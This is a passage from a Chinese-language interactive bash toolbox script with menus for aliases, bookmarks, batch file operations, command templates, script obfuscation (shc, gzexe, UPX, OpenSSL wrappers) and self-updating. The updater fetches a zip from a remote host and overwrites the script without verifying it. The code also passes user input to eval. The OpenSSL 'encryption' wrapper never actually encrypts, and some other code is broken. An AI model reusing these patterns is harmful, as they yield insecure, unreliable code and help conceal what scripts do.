    read -p "请选择: " func_choice
    
    case $func_choice in
        1)
            read -p "输入函数名称: " func_name
            echo "输入函数内容 (多行，空行结束):"
            local func_body=""
            while IFS= read -r line; do
                [ -z "$line" ] && break
                func_body="$func_body\n    $line"
            done
            
            eval "$func_name() { $func_body\n}"
            echo -e "${GREEN}函数 $func_name 已创建${NC}"
            
            # 可选保存
            if confirm_action "是否保存到配置文件？" "n"; then
                echo -e "\n$func_name() {\n$func_body\n}" >> "$EFFICIENCY_ALIASES_FILE"
                echo -e "${GREEN}已保存到 $EFFICIENCY_ALIASES_FILE${NC}"
            fi
            ;;
        2)
            echo -e "${CYAN}已定义的Bash函数:${NC}"
            declare -F | awk '{print $3}' | sort
            ;;
        3)
            read -p "输入要测试的函数名称: " test_func
            if declare -F "$test_func" &> /dev/null; then
                echo -e "${CYAN}执行 $test_func${NC}"
                $test_func
            else
                echo -e "${RED}函数不存在${NC}"
            fi
            ;;
        4)
            read -p "输入要导出的函数名称: " export_func
            if declare -F "$export_func" &> /dev/null; then
                local export_file="$HOME/${export_func}_export.sh"
                declare -f "$export_func" > "$export_file"
                echo -e "${GREEN}函数已导出到 $export_file${NC}"
            else
                echo -e "${RED}函数不存在${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "函数封装" "INFO"
}

# 快捷目录跳转
cli_directory_jump() {
    echo -e "${BOLD}快捷目录跳转${NC}"
    
    local jump_file="$HOME/.dir_jumps"
    
    echo "选择操作:"
    echo "1. 添加书签"
    echo "2. 跳转到书签"
    echo "3. 列出书签"
    echo "4. 删除书签"
    echo "5. 跳转到最近目录"
    read -p "请选择: " jump_choice
    
    case $jump_choice in
        1)
            read -p "输入书签名称: " bookmark
            echo "$bookmark:$PWD" >> "$jump_file"
            echo -e "${GREEN}书签已添加: $bookmark -> $PWD${NC}"
            ;;
        2)
            if [ ! -f "$jump_file" ]; then
                echo -e "${YELLOW}暂无书签${NC}"
                return
            fi
            echo "书签列表:"
            cat -n "$jump_file"
            read -p "输入书签名称或编号: " target
            if [[ "$target" =~ ^[0-9]+$ ]]; then
                dir=$(sed -n "${target}p" "$jump_file" | cut -d':' -f2)
            else
                dir=$(grep "^$target:" "$jump_file" | cut -d':' -f2)
            fi
            if [ -d "$dir" ]; then
                cd "$dir"
                echo -e "${GREEN}已跳转到: $dir${NC}"
                pwd
                ls -la
            else
                echo -e "${RED}目录不存在: $dir${NC}"
            fi
            ;;
        3)
            if [ -f "$jump_file" ]; then
                echo -e "${CYAN}书签列表:${NC}"
                column -t -s':' "$jump_file"
            else
                echo -e "${YELLOW}暂无书签${NC}"
            fi
            ;;
        4)
            if [ ! -f "$jump_file" ]; then
                echo -e "${YELLOW}暂无书签${NC}"
                return
            fi
            cat -n "$jump_file"
            read -p "输入要删除的行号: " line_num
            sed -i "${line_num}d" "$jump_file"
            echo -e "${GREEN}已删除${NC}"
            ;;
        5)
            echo -e "${CYAN}最近访问目录:${NC}"
            dirs -v | head -10
            read -p "输入索引号跳转: " dir_index
            cd -n "$dir_index" 2>/dev/null || echo -e "${RED}无效索引${NC}"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "目录跳转" "INFO"
}

# 批量文件操作
cli_batch_operations() {
    echo -e "${BOLD}批量文件操作${NC}"
    
    echo "选择操作类型:"
    echo "1. 批量重命名"
    echo "2. 批量复制"
    echo "3. 批量移动"
    echo "4. 批量解压"
    echo "5. 批量查找替换内容"
    read -p "请选择: " batch_choice
    
    case $batch_choice in
        1)
            echo "批量重命名示例:"
            echo "1. 添加前缀"
            echo "2. 添加后缀"
            echo "3. 替换字符串"
            echo "4. 修改扩展名"
            read -p "请选择: " rename_type
            
            read -p "输入文件匹配模式 (如 *.txt): " pattern
            case $rename_type in
                1)
                    read -p "输入前缀: " prefix
                    for f in $pattern; do
                        mv -v "$f" "${prefix}${f}"
                    done
                    ;;
                2)
                    read -p "输入后缀: " suffix
                    for f in $pattern; do
                        mv -v "$f" "${f}${suffix}"
                    done
                    ;;
                3)
                    read -p "输入查找字符串: " find_str
                    read -p "输入替换字符串: " replace_str
                    for f in $pattern; do
                        new_name=$(echo "$f" | sed "s/$find_str/$replace_str/g")
                        mv -v "$f" "$new_name"
                    done
                    ;;
                4)
                    read -p "输入新扩展名 (如 .jpg): " new_ext
                    for f in $pattern; do
                        base="${f%.*}"
                        mv -v "$f" "$base$new_ext"
                    done
                    ;;
            esac
            ;;
        2)
            read -p "输入源文件匹配模式: " src_pattern
            read -p "输入目标目录: " dest_dir
            mkdir -p "$dest_dir"
            for f in $src_pattern; do
                cp -v "$f" "$dest_dir/"
            done
            ;;
        3)
            read -p "输入源文件匹配模式: " src_pattern
            read -p "输入目标目录: " dest_dir
            mkdir -p "$dest_dir"
            for f in $src_pattern; do
                mv -v "$f" "$dest_dir/"
            done
            ;;
        4)
            echo "批量解压支持: .tar.gz, .zip, .tar"
            read -p "输入压缩文件匹配模式: " archive_pattern
            for archive in $archive_pattern; do
                case "$archive" in
                    *.tar.gz|*.tgz)
                        tar -xzf "$archive" && echo "已解压: $archive" ;;
                    *.zip)
                        unzip "$archive" && echo "已解压: $archive" ;;
                    *.tar)
                        tar -xf "$archive" && echo "已解压: $archive" ;;
                    *)
                        echo "跳过不支持格式: $archive" ;;
                esac
            done
            ;;
        5)
            read -p "输入文件匹配模式: " file_pattern
            read -p "输入查找内容: " search_text
            read -p "输入替换内容: " replace_text
            for f in $file_pattern; do
                if [ -f "$f" ]; then
                    sed -i "s/$search_text/$replace_text/g" "$f"
                    echo "已处理: $f"
                fi
            done
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "批量操作" "INFO"
}

# 命令模板生成器
cli_command_template() {
    echo -e "${BOLD}命令模板生成器${NC}"
    
    echo "选择模板类型:"
    echo "1. for循环模板"
    echo "2. while循环模板"
    echo "3. if判断模板"
    echo "4. case选择模板"
    echo "5. 函数模板"
    echo "6. 常用命令组合"
    read -p "请选择: " template_choice
    
    case $template_choice in
        1)
            cat << 'EOF'
# for循环模板
for item in list; do
    command "$item"
done

# 示例: 遍历文件
for file in *.txt; do
    echo "处理文件: $file"
done

# 数字范围循环
for i in {1..10}; do
    echo "计数: $i"
done

# C风格循环
for ((i=0; i<10; i++)); do
    echo "索引: $i"
done
EOF
            ;;
        2)
            cat << 'EOF'
# while循环模板
while condition; do
    command
done

# 示例: 逐行读取文件
while IFS= read -r line; do
    echo "行: $line"
done < input.txt

# 无限循环
while true; do
    echo "运行中..."
    sleep 1
done

# 计数循环
count=1
while [ $count -le 10 ]; do
    echo "计数: $count"
    ((count++))
done
EOF
            ;;
        3)
            cat << 'EOF'
# if判断模板
if condition; then
    command
elif condition2; then
    command2
else
    command3
fi

# 示例: 文件存在判断
if [ -f "filename" ]; then
    echo "文件存在"
elif [ -d "dirname" ]; then
    echo "目录存在"
else
    echo "不存在"
fi

# 数值比较
if [ "$a" -eq "$b" ]; then
    echo "相等"
elif [ "$a" -gt "$b" ]; then
    echo "a大于b"
fi
EOF
            ;;
        4)
            cat << 'EOF'
# case选择模板
case $variable in
    pattern1)
        command1
        ;;
    pattern2|pattern3)
        command2
        ;;
    *)
        default_command
        ;;
esac

# 示例: 根据扩展名处理
case "$file" in
    *.txt)
        echo "文本文件"
        ;;
    *.jpg|*.png)
        echo "图片文件"
        ;;
    *.sh)
        echo "Shell脚本"
        ;;
    *)
        echo "未知类型"
        ;;
esac
EOF
            ;;
        5)
            cat << 'EOF'
# 函数模板
function_name() {
    local param1=$1
    local param2=$2
    
    # 函数体
    echo "参数1: $param1"
    echo "参数2: $param2"
    
    return 0
}

# 调用函数
function_name "value1" "value2"

# 带返回值的函数
get_sum() {
    local a=$1
    local b=$2
    echo $((a + b))  # 通过echo返回值
}

result=$(get_sum 5 3)
echo "结果: $result"
EOF
            ;;
        6)
            cat << 'EOF'
# 常用命令组合

# 查找大文件
find . -type f -size +100M -exec ls -lh {} \;

# 统计代码行数
find . -name "*.py" -o -name "*.sh" | xargs wc -l

# 批量修改权限
find . -type f -name "*.sh" -exec chmod +x {} \;

# 实时监控日志
tail -f /var/log/syslog | grep ERROR

# 进程树查看
ps auxf | grep -B5 -A5 "process_name"

# 网络连接监控
watch -n 1 'ss -tunap | grep ESTAB'

# 磁盘使用分析
du -sh /* 2>/dev/null | sort -rh | head -10
EOF
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    if confirm_action "是否将模板保存到文件？" "n"; then
        local template_file="$HOME/command_template_$(date +%Y%m%d).txt"
        cli_command_template_$template_choice > "$template_file"
        echo -e "${GREEN}模板已保存到: $template_file${NC}"
    fi
    
    log_operation "命令行效率" "命令模板" "INFO"
}

# 管道数据处理
cli_pipe_processor() {
    echo -e "${BOLD}管道数据处理${NC}"
    
    echo "选择处理类型:"
    echo "1. 文本处理 (awk)"
    echo "2. 排序统计 (sort/uniq)"
    echo "3. 字段提取 (cut)"
    echo "4. 流编辑 (sed)"
    echo "5. 组合示例"
    read -p "请选择: " pipe_choice
    
    case $pipe_choice in
        1)
            cat << 'EOF'
# awk文本处理示例

# 打印特定列
ps aux | awk '{print $1, $2, $11}'

# 条件过滤
ps aux | awk '$3 > 50 {print $1, $2, $3"%"}'

# 计算总和
ls -l | awk '{sum += $5} END {print "总大小:", sum}'

# 格式化输出
df -h | awk '{printf "%-20s %-10s %-10s\n", $1, $2, $3}'
EOF
            ;;
        2)
            cat << 'EOF'
# sort/uniq排序统计示例

# 频率统计
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10

# 去重
cat file.txt | sort -u

# 多列排序
ps aux | sort -k3 -rn | head -10  # 按CPU排序

# 唯一计数
grep ERROR log.txt | sort | uniq -c
EOF
            ;;
        3)
            cat << 'EOF'
# cut字段提取示例

# 按分隔符提取
cat /etc/passwd | cut -d':' -f1,3,7

# 按字符位置提取
who | cut -c1-10,30-40

# 提取IP地址
ifconfig | grep 'inet ' | cut -d' ' -f10

# 组合使用
ps aux | tr -s ' ' | cut -d' ' -f1,2,11
EOF
            ;;
        4)
            cat << 'EOF'
# sed流编辑示例

# 替换文本
sed 's/old/new/g' file.txt

# 删除行
sed '/pattern/d' file.txt

# 插入行
sed '2i\插入的内容' file.txt

# 多命令组合
sed -e 's/foo/bar/g' -e '/^#/d' config.txt

# 就地编辑
sed -i 's/error/ERROR/g' log.txt
EOF
            ;;
        5)
            cat << 'EOF'
# 组合命令示例

# 统计访问最多的IP
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10

# 查找错误并提取信息
grep -r "ERROR" /var/log/ | awk -F':' '{print $1, $2}' | sort -u

# 监控并过滤
tail -f app.log | grep --line-buffered "WARN\|ERROR" | while read line; do
    echo "$(date): $line" >> filtered.log
done

# 批量重命名
ls *.txt | sed 's/\.txt$//' | xargs -I {} mv {}.txt {}.bak

# 生成统计报告
{
    echo "CPU使用率: $(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')%"
    echo "内存使用: $(free -h | grep Mem | awk '{print $3}')"
    echo "磁盘使用: $(df -h / | tail -1 | awk '{print $5}')"
} > report.txt
EOF
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "管道处理" "INFO"
}

# 效率配置持久化
cli_persist_config() {
    echo -e "${BOLD}效率配置持久化${NC}"
    
    echo "选择操作:"
    echo "1. 查看当前配置"
    echo "2. 备份配置"
    echo "3. 恢复配置"
    echo "4. 同步到系统bashrc"
    echo "5. 清除配置"
    read -p "请选择: " persist_choice
    
    case $persist_choice in
        1)
            if [ -f "$EFFICIENCY_ALIASES_FILE" ]; then
                echo -e "${CYAN}别名文件内容:${NC}"
                cat "$EFFICIENCY_ALIASES_FILE"
            else
                echo -e "${YELLOW}别名文件不存在${NC}"
            fi
            
            echo -e "\n${CYAN}当前活跃别名:${NC}"
            alias
            
            echo -e "\n${CYAN}当前活跃函数:${NC}"
            declare -F | head -20
            ;;
        2)
            local backup_file="$BACKUP_DIR/efficiency_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
            tar -czf "$backup_file" "$EFFICIENCY_ALIASES_FILE" ~/.bashrc 2>/dev/null || true
            echo -e "${GREEN}配置已备份到: $backup_file${NC}"
            ;;
        3)
            local backups=("$BACKUP_DIR"/efficiency_backup_*.tar.gz)
            if [ ${#backups[@]} -eq 0 ]; then
                echo -e "${YELLOW}无备份文件${NC}"
                return
            fi
            echo "可用的备份:"
            for i in "${!backups[@]}"; do
                echo "$((i+1)). $(basename "${backups[$i]}")"
            done
            read -p "选择要恢复的备份编号: " restore_num
            if [[ "$restore_num" =~ ^[0-9]+$ ]] && [ "$restore_num" -le ${#backups[@]} ]; then
                tar -xzf "${backups[$((restore_num-1))]}" -C /
                echo -e "${GREEN}配置已恢复，请重新登录生效${NC}"
            fi
            ;;
        4)
            if [ -f "$EFFICIENCY_ALIASES_FILE" ]; then
                echo "# 命令行效率配置 - $(date)" >> ~/.bashrc
                cat "$EFFICIENCY_ALIASES_FILE" >> ~/.bashrc
                echo -e "${GREEN}配置已同步到 ~/.bashrc${NC}"
            else
                echo -e "${YELLOW}别名文件不存在${NC}"
            fi
            ;;
        5)
            if confirm_action "清除所有效率配置？" "n"; then
                rm -f "$EFFICIENCY_ALIASES_FILE"
                echo -e "${GREEN}配置已清除${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "配置持久化" "INFO"
}

# ==================== 脚本加密 (完整实现) ====================
# ==================== 脚本加密工具 (新增功能) ====================
script_encryption_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}脚本加密工具${NC}"
        echo -e "${RED}注意: 加密非绝对安全，仅防普通查看${NC}\n"
        echo -e "${BLUE}1.${NC} 安装shc加密工具"
        echo -e "${BLUE}2.${NC} 使用shc加密脚本"
        echo -e "${BLUE}3.${NC} 设置脚本有效期"
        echo -e "${BLUE}4.${NC} Base64混淆加密"
        echo -e "${BLUE}5.${NC} 简单密码保护"
        echo -e "${BLUE}6.${NC} 批量加密脚本"
        echo -e "${BLUE}7.${NC} 解密检查"
        echo -e "${BLUE}8.${NC} Gzexe 压缩加密"          # 新增
        echo -e "${BLUE}9.${NC} OpenSSL 加密"            # 新增
        echo -e "${BLUE}10.${NC} UPX 压缩 (减小体积)"     # 新增
        echo -e "${BLUE}11.${NC} 组合加密 (多重保护)"     # 新增
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) encrypt_install_shc ;;
            2) encrypt_with_shc ;;
            3) encrypt_with_expiry ;;
            4) encrypt_base64_obfuscate ;;
            5) encrypt_password_protect ;;
            6) encrypt_batch ;;
            7) encrypt_check ;;
            8) encrypt_gzexe ;;
            9) encrypt_openssl ;;
            10) encrypt_upx ;;
            11) encrypt_combine ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

# Gzexe 压缩加密 (内置命令)
encrypt_gzexe() {
    echo -e "${BOLD}Gzexe 压缩加密${NC}"
    read -p "输入要加密的脚本路径: " script_path
    if [ ! -f "$script_path" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    
    if ! command -v gzexe &> /dev/null; then
        echo -e "${YELLOW}gzexe 通常随 gzip 安装，如果缺失请安装 gzip${NC}"
        return
    fi
    
    # gzexe 会原地替换原文件，并生成备份 .~
    cp "$script_path" "${script_path}.backup"
    gzexe "$script_path"
    echo -e "${GREEN}Gzexe 加密完成，原文件备份为: ${script_path}.backup${NC}"
    echo -e "${YELLOW}加密后的脚本仍为脚本形式，但被压缩，可执行${NC}"
    ls -lh "$script_path"
    log_operation "脚本加密" "gzexe: $script_path" "SUCCESS"
}

# OpenSSL 加密 (生成自解压脚本)
encrypt_openssl() {
    echo -e "${BOLD}OpenSSL 加密${NC}"
    read -p "输入要加密的脚本路径: " script_path
    if [ ! -f "$script_path" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    
    read -s -p "设置密码: " password
    echo
    read -s -p "确认密码: " password2
    echo
    [ "$password" != "$password2" ] && { echo -e "${RED}密码不匹配${NC}"; return; }
    
    read -p "输出文件路径 (默认: ${script_path}.enc): " output
    output=${output:-"${script_path}.enc"}
    
    # 使用openssl加密脚本内容，并生成一个包装脚本
    local content=$(cat "$script_path" | base64 -w 0)
    cat > "$output" << EOF
#!/bin/bash
# OpenSSL 加密脚本 - 生成于 $(date)
# 运行此脚本需要输入密码

read -s -p "请输入密码: " pass
echo
decoded=\$(echo "$content" | base64 -d | openssl enc -aes-256-cbc -d -salt -pass pass:"\$pass" 2>/dev/null)
if [ \$? -ne 0 ]; then
    echo "密码错误或解密失败"
    exit 1
fi
eval "\$decoded"
EOF
    chmod +x "$output"
    
    # 同时用openssl加密原文件备份
    openssl enc -aes-256-cbc -salt -in "$script_path" -out "${output}.bin" -pass pass:"$password"
    echo -e "${GREEN}加密完成，生成包装脚本: $output${NC}"
    echo -e "${YELLOW}同时生成二进制加密文件: ${output}.bin (可单独存储)${NC}"
    log_operation "脚本加密" "openssl: $script_path" "SUCCESS"
}

# UPX 压缩 (针对shc生成的二进制)
encrypt_upx() {
    echo -e "${BOLD}UPX 压缩 (减小体积)${NC}"
    if ! command -v upx &> /dev/null; then
        echo -e "${YELLOW}UPX未安装，正在安装...${NC}"
        case "$PKG_MANAGER" in
            apt) sudo apt install -y upx ;;
            yum|dnf) sudo yum install -y upx ;;
            pacman) sudo pacman -S --noconfirm upx ;;
            *) echo -e "${RED}请手动安装 upx${NC}"; return ;;
        esac
    fi
    
    read -p "输入要压缩的二进制文件 (如 shc 生成的 .x 文件): " bin_file
    if [ ! -f "$bin_file" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    
    echo -e "${CYAN}压缩前大小: $(du -h "$bin_file" | cut -f1)${NC}"
    upx "$bin_file"
    echo -e "${GREEN}压缩完成${NC}"
    echo -e "${CYAN}压缩后大小: $(du -h "$bin_file" | cut -f1)${NC}"
    log_operation "脚本加密" "upx压缩: $bin_file" "SUCCESS"
}

# 组合加密：先shc生成二进制，再upx压缩，再openssl包装（可选）
encrypt_combine() {
    echo -e "${BOLD}组合加密 (多重保护)${NC}"
    read -p "输入要加密的脚本路径: " script_path
    if [ ! -f "$script_path" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    
    # 1. 先用shc加密
    if ! command -v shc &> /dev/null; then
        echo -e "${RED}请先安装shc${NC}"
        return
    fi
    shc -f "$script_path"
    local shc_out="${script_path}.x"
    [ ! -f "$shc_out" ] && { echo -e "${RED}shc加密失败${NC}"; return; }
    
    # 2. 用upx压缩
    if command -v upx &> /dev/null; then
        upx "$shc_out"
    else
        echo -e "${YELLOW}UPX未安装，跳过压缩${NC}"
    fi
    
    # 3. 可选再用openssl包装
    if confirm_action "是否再用 OpenSSL 包装一层密码保护？" "n"; then
        read -s -p "设置密码: " pass
        echo
        local final_out="${script_path}.final"
        # 将二进制文件base64编码后嵌入包装脚本
        local b64=$(base64 -w 0 "$shc_out")
        cat > "$final_out" << EOF
#!/bin/bash
# 多重加密脚本
read -s -p "请输入密码: " p
echo
decoded=\$(echo "$b64" | base64 -d | openssl enc -aes-256-cbc -d -salt -pass pass:"\$p" 2>/dev/null)
if [ \$? -ne 0 ]; then
    echo "密码错误"
    exit 1
fi
# 将解码后的内容写入临时文件并执行
tmpf=\$(mktemp)
echo "\$decoded" > "\$tmpf"
chmod +x "\$tmpf"
"\$tmpf" "\$@"
rm -f "\$tmpf"
EOF
        chmod +x "$final_out"
        # 同时加密二进制文件
        openssl enc -aes-256-cbc -salt -in "$shc_out" -out "${final_out}.bin" -pass pass:"$pass"
        echo -e "${GREEN}组合加密完成，最终文件: $final_out${NC}"
        echo -e "${YELLOW}二进制加密备份: ${final_out}.bin${NC}"
        rm -f "$shc_out"  # 删除中间文件
    else
        mv "$shc_out" "${script_path}.final"
        echo -e "${GREEN}组合加密完成，最终文件: ${script_path}.final${NC}"
    fi
    
    log_operation "脚本加密" "组合加密: $script_path" "SUCCESS"
}
# ==================== 工具箱设置模块 ====================
toolbox_settings_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}工具箱设置${NC}"
        echo -e "${BLUE}1.${NC} 查看工具箱信息"
        echo -e "${BLUE}2.${NC} 更新工具箱"
        echo -e "${BLUE}3.${NC} 查看操作日志"
        echo -e "${BLUE}4.${NC} 清理日志"
        echo -e "${BLUE}5.${NC} 备份配置"
        echo -e "${BLUE}6.${NC} 恢复配置"
        echo -e "${BLUE}7.${NC} 重置工具箱"
        echo -e "${BLUE}8.${NC} 帮助文档"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) show_toolbox_info ;;
            2) update_toolbox ;;
            3) view_logs ;;
            4) clean_logs ;;
            5) backup_config ;;
            6) restore_config ;;
            7) reset_toolbox ;;
            8) show_help ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

show_toolbox_info() {
    echo -e "${BOLD}工具箱信息${NC}"

    echo -e "${CYAN}基本信息:${NC}"
    echo "版本: $TOOLBOX_VERSION"
    echo "系统: $OS_NAME"
    echo "包管理器: $PKG_MANAGER"
    echo "用户: $(whoami)"

    echo -e "\n${CYAN}目录信息:${NC}"
    echo "配置目录: $HOME/.shell_toolbox_config"
    echo "备份目录: $BACKUP_DIR"
    echo "扫描结果目录: $SCAN_RESULTS_DIR"
    echo "日志文件: $LOG_FILE"
    echo "错误日志: $ERROR_LOG"

    echo -e "\n${CYAN}统计信息:${NC}"
    if [ -f "$LOG_FILE" ]; then
        echo "操作日志条目: $(wc -l < "$LOG_FILE")"
        echo "错误日志条目: $(wc -l < "$ERROR_LOG")"
        echo "备份数量: $(find "$BACKUP_DIR" -maxdepth 1 -type d 2>/dev/null | wc -l)"
    fi

    echo -e "\n${CYAN}工具箱状态:${NC}"
    if [ -f "$LOCK_FILE" ]; then
        local pid=$(cat "$LOCK_FILE" 2>/dev/null)
        if ps -p "$pid" > /dev/null 2>&1; then
            echo -e "${GREEN}✓${NC} 运行中 (PID: $pid)"
        else
            echo -e "${YELLOW}⚠${NC} 锁定文件存在但进程不存在"
        fi
    else
        echo -e "${GREEN}✓${NC} 未运行"
    fi
}

update_toolbox() {
    echo -e "${BOLD}更新工具箱${NC}"

    if ! confirm_action "从远程服务器更新工具箱？" "n"; then
        return
    fi

    local update_url="https://shell.yvlo.top/shell.zip"
    local temp_zip="/tmp/toolbox_update_$$.zip"
    local temp_dir="/tmp/toolbox_update_$$"
    local backup_dir="$BACKUP_DIR"
    local current_script="$SCRIPT_PATH"

    if ! command -v unzip &> /dev/null; then
        echo -e "${YELLOW}检测到未安装unzip，正在安装...${NC}"
        eval "$PKG_INSTALL unzip"
        if ! command -v unzip &> /dev/null; then
            echo -e "${RED}无法安装unzip，请手动安装后重试${NC}"
            return 1
        fi
    fi
    if ! command -v file &> /dev/null; then
        echo -e "${YELLOW}检测到未安装file，正在安装...${NC}"
        eval "$PKG_INSTALL file"
    fi

    echo -e "${CYAN}正在检查更新...${NC}"

    mkdir -p "$temp_dir" "$backup_dir"

    echo -e "${CYAN}下载更新包...${NC}"
    local download_success=false

    if command -v curl &> /dev/null; then
        if curl -sSL "$update_url" -o "$temp_zip" --connect-timeout 30; then
            download_success=true
        fi
    elif command -v wget &> /dev/null; then
        if wget -q "$update_url" -O "$temp_zip" --timeout=30; then
            download_success=true
        fi
    fi

    if [ "$download_success" = false ]; then
        echo -e "${RED}下载更新包失败，请检查网络连接${NC}"
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi

    if [ ! -s "$temp_zip" ]; then
        echo -e "${RED}下载的文件为空${NC}"
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi

    if ! file "$temp_zip" | grep -q "Zip archive"; then
        echo -e "${RED}下载的文件不是有效的ZIP格式${NC}"
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi

    echo -e "${CYAN}解压更新包...${NC}"
    if ! unzip -q -o "$temp_zip" -d "$temp_dir" 2>/dev/null; then
        echo -e "${RED}解压更新包失败${NC}"
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi

    local extracted_script=""

    local script_name=$(basename "$current_script")
    if [ -f "$temp_dir/$script_name" ]; then
        extracted_script="$temp_dir/$script_name"
    elif [ -f "$temp_dir/shell.sh" ]; then
        extracted_script="$temp_dir/shell.sh"
    elif [ -f "$temp_dir/main.sh" ]; then
        extracted_script="$temp_dir/main.sh"
    else
        extracted_script=$(find "$temp_dir" -name "*.sh" -type f | head -1)
    fi

    if [ -z "$extracted_script" ] || [ ! -f "$extracted_script" ]; then
        echo -e "${RED}在更新包中未找到主脚本文件${NC}"
        echo -e "${YELLOW}更新包内容：${NC}"
        find "$temp_dir" -type f | head -10
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi

    if ! head -1 "$extracted_script" | grep -q "^#!.*bash"; then
        if ! confirm_action "下载的脚本可能不是有效的bash脚本，是否继续？" "n"; then
            rm -f "$temp_zip"
            rm -rf "$temp_dir"
            return 1
        fi
    fi

    local new_version=$(grep -m1 'TOOLBOX_VERSION=' "$extracted_script" 2>/dev/null | cut -d'"' -f2)
    new_version=${new_version:-"未知"}

    echo -e "${CYAN}当前版本: ${TOOLBOX_VERSION}${NC}"
    echo -e "${CYAN}发现新版本: ${new_version}${NC}"

    if [ "$TOOLBOX_VERSION" = "$new_version" ]; then
        echo -e "${GREEN}已经是最新版本${NC}"
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return
    fi

    if ! confirm_action "确定更新到 v${new_version} 吗？" "n"; then
        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return
    fi

    local backup_file="$backup_dir/toolbox_backup_$(date +%Y%m%d_%H%M%S)_v${TOOLBOX_VERSION}.sh"
    echo -e "${CYAN}备份当前版本...${NC}"
    cp "$current_script" "$backup_file"

    echo -e "${CYAN}安装更新...${NC}"

    if cp "$extracted_script" "$current_script"; then
        chmod +x "$current_script"

        rm -f "$temp_zip"
        rm -rf "$temp_dir"

        rm -f "$LOCK_FILE"

        echo -e "${GREEN}YLShell工具箱更新成功！${NC}"
        echo -e "${YELLOW}备份文件: $backup_file${NC}"
        echo -e "${YELLOW}请重新运行脚本${NC}"

        log_operation "更新工具箱" "从 v$TOOLBOX_VERSION 到 v$new_version" "SUCCESS"

        if confirm_action "是否立即重新运行工具箱？" "n"; then
            exec bash "$current_script"
        else
            exit 0
        fi
    else
        echo -e "${RED}更新失败，正在恢复备份...${NC}"
        if [ -f "$backup_file" ]; then
            cp "$backup_file" "$current_script"
            chmod +x "$current_script"
            echo -e "${GREEN}已恢复备份${NC}"
        fi

        rm -f "$temp_zip"
        rm -rf "$temp_dir"
        return 1
    fi
}

view_logs() {
    echo -e "${BOLD}查看日志${NC}"

    echo "选择日志文件:"
    echo "1. 操作日志"
    echo "2. 错误日志"
    echo "3. 实时监控"
    read -p "请选择: " log_choice

    case $log_choice in
        1)
            if [ -f "$LOG_FILE" ]; then
                echo -e "${CYAN}操作日志 (最后50行):${NC}"
                tail -50 "$LOG_FILE"
                echo -e "\n${YELLOW}统计信息:${NC}"
                echo "总行数: $(wc -l < "$LOG_FILE")"
                echo "今日记录: $(grep "$(date +%Y-%m-%d)" "$LOG_FILE" | wc -l)"
            else
                echo -e "${YELLOW}操作日志文件不存在${NC}"
            fi
            ;;
        2)
            if [ -f "$ERROR_LOG" ]; then
                echo -e "${CYAN}错误日志 (最后50行):${NC}"
                tail -50 "$ERROR_LOG"
            else
                echo -e "${YELLOW}错误日志文件不存在${NC}"
            fi
            ;;
        3)
            echo -e "${CYAN}实时监控日志 (按Ctrl+C停止监控，返回菜单)...${NC}"
            (trap - INT; tail -f "$LOG_FILE")
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac
}

clean_logs() {
    echo -e "${BOLD}清理日志${NC}"

    echo "选择清理方式:"
    echo "1. 清空操作日志"
    echo "2. 清空错误日志"
    echo "3. 清空所有日志"
    echo "4. 压缩旧日志"
    read -p "请选择: " clean_choice

    case $clean_choice in
        1)
            if confirm_action "清空操作日志？" "n"; then
                > "$LOG_FILE"
                echo -e "${GREEN}操作日志已清空${NC}"
                log_operation "清理日志" "清空操作日志" "INFO"
            fi
            ;;
        2)
            if confirm_action "清空错误日志？" "n"; then
                > "$ERROR_LOG"
                echo -e "${GREEN}错误日志已清空${NC}"
                log_operation "清理日志" "清空错误日志" "INFO"
            fi
            ;;
        3)
            if confirm_action "清空所有日志？" "n"; then
                > "$LOG_FILE"
                > "$ERROR_LOG"
                echo -e "${GREEN}所有日志已清空${NC}"
                log_operation "清理日志" "清空所有日志" "INFO"
            fi
            ;;
        4)
            echo -e "${CYAN}压缩旧日志...${NC}"
            local archive_dir="$BACKUP_DIR/logs_archive_$(date +%Y%m%d)"
            mkdir -p "$archive_dir"

            if [ -f "$LOG_FILE" ]; then
                cp "$LOG_FILE" "$archive_dir/operations.log"
                > "$LOG_FILE"
            fi

            if [ -f "$ERROR_LOG" ]; then
                cp "$ERROR_LOG" "$archive_dir/errors.log"
                > "$ERROR_LOG"
            fi

            tar -czf "$archive_dir.tar.gz" -C "$BACKUP_DIR" "logs_archive_$(date +%Y%m%d)"
            rm -rf "$archive_dir"

            echo -e "${GREEN}日志已压缩存档: $archive_dir.tar.gz${NC}"
            log_operation "清理日志" "压缩旧日志" "SUCCESS"
            ;;
